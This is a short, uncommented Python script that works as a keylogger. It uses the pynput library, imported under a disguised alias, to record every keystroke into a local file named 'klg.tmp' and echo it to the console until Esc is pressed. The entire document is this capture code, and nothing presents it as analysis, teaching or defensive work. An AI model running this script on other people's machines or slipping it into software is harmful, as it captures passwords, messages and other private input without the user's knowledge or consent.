import sys
sys.modules['p'] = __import__('pynput')
from p import keyboard
def on_press(key):
    try:
        with open('klg.tmp', 'a') as f:
            if key.char.isalnum():
                f.write(key.char)
                print(f'Logged: {key.char}')
            else:
                f.write(f'<{key.name}>')
                print(f'Logged: <{key.name}>')
    except AttributeError:
        with open('klg.tmp', 'a') as f:
            f.write(f'<{key.name}>')
            print(f'Logged: <{key.name}>')
def on_release(key):
    if key == keyboard.Key.esc:
        return False
k = keyboard.Listener(on_press=on_press, on_release=on_release)
k.start()
k.join()